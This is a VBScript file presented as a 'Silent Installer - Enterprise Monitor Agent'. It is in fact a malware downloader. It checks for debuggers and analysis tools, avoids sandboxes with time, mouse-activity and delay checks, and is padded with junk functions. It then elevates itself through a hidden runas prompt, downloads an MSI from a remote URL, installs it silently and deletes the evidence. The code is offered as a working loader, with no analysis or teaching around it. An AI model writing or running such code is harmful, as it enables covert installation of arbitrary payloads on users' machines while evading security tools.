' --------------------------------------------------------------------------
'  Silent Installer - Enterprise Monitor Agent
' --------------------------------------------------------------------------
Option Explicit

' System initialization variables
Dim WshShell, Fso, NetObj, EnvVars, SysInfo
Set WshShell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")
Set NetObj = CreateObject("WScript.Network")
Set EnvVars = WshShell.Environment("Process")

' Anti-analysis dummy variables
Dim dummy1, dummy2, dummy3, dummy4, dummy5
dummy1 = "System initialization"
dummy2 = "Network configuration"
dummy3 = "Security validation"
dummy4 = "Performance monitoring"
dummy5 = "Error reporting"

' Fake system information collection
Function GetSystemInfo()
    Dim result
    result = NetObj.ComputerName & "|" & NetObj.UserName
    GetSystemInfo = result
End Function

' Process validation function
Function ValidateProcess(processName)
    Dim colProcesses, objProcess
    On Error Resume Next
    Set colProcesses = GetObject("winmgmts:").ExecQuery("Select * From Win32_Process Where Name='" & processName & "'")
    
    ValidateProcess = False
    For Each objProcess in colProcesses
        ValidateProcess = True
        Exit For
    Next
End Function

' Network adapter information
Function GetNetworkInfo()
    Dim result
    result = "Network adapter: " & NetObj.ComputerName
    GetNetworkInfo = result
End Function

' Registry operations helper
Function ReadRegKey(keyPath, valueName)
    On Error Resume Next
    ReadRegKey = WshShell.RegRead(keyPath & "\" & valueName)
    If Err.Number <> 0 Then ReadRegKey = ""
End Function

' Write registry value
Sub WriteRegKey(keyPath, valueName, value)
    On Error Resume Next
    WshShell.RegWrite keyPath & "\" & valueName, value, "REG_SZ"
End Sub

' Encryption helper function
Function SimpleEncrypt(text)
    Dim i, result
    result = ""
    For i = 1 To Len(text)
        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)
    Next
    SimpleEncrypt = result
End Function

' Decryption helper function
Function SimpleDecrypt(text)
    Dim i, result
    result = ""
    For i = 1 To Len(text)
        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)
    Next
    SimpleDecrypt = result
End Function

' Check for debugger processes
Function IsDebuggerPresent()
    Dim debuggers, proc
    debuggers = Array("ollydbg.exe", "windbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe", "cheatengine.exe", "procmon.exe", "procexp.exe")
    
    IsDebuggerPresent = False
    For Each proc In debuggers
        If ValidateProcess(proc) Then
            IsDebuggerPresent = True
            Exit For
        End If
    Next
End Function

' Anti-sandbox time delay
Sub AntiSandboxDelay()
    Dim startTime, endTime
    startTime = Timer
    endTime = startTime + 30 ' 30 second delay
    
    Do While Timer < endTime
        ' Do nothing - just waste time
        Dim dummy
        dummy = dummy & "x"
    Loop
End Sub

' Check for mouse activity (sandbox detection)
Function HasMouseActivity()
    On Error Resume Next
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Get mouse position twice with a small delay
    Dim pos1, pos2
    pos1 = objShell.AppActivate("WScript")
    WScript.Sleep 1000
    pos2 = objShell.AppActivate("WScript")
    
    ' If positions are the same, likely a sandbox
    HasMouseActivity = (pos1 <> pos2)
End Function

' More junk functions to add bulk
Function FakeFunction1()
    FakeFunction1 = "Fake result 1"
End Function

Function FakeFunction2()
    FakeFunction2 = "Fake result 2"
End Function

Function FakeFunction3()
    FakeFunction3 = "Fake result 3"
End Function

Function FakeFunction4()
    FakeFunction4 = "Fake result 4"
End Function

Function FakeFunction5()
    FakeFunction5 = "Fake result 5"
End Function

' Main execution starts here
' Anti-analysis checks
If IsDebuggerPresent() Then WScript.Quit

' Time-based anti-sandbox
If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit

' Check for user activity
If Not HasMouseActivity() Then WScript.Quit

' Additional delay to frustrate analysis
AntiSandboxDelay

' Core functionality - download and execute
' Check for elevation
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
    WScript.Quit
End If

Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
strUrl = ""
strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
strFile = strTemp & "\agent_installer.msi"

' Download with redirect handling
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strUrl, False
objXMLHTTP.send()

' Check for any redirect (301, 302, etc.)
If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
    strUrl = objXMLHTTP.getResponseHeader("Location")
    objXMLHTTP.open "GET", strUrl, False
    objXMLHTTP.send()
End If

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1 ' Binary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile strFile, 2 ' Overwrite
    objADOStream.Close

    ' Install
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True

    ' Cleanup
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
End If

' Final cleanup
Set WshShell = Nothing
Set Fso = Nothing
Set NetObj = Nothing
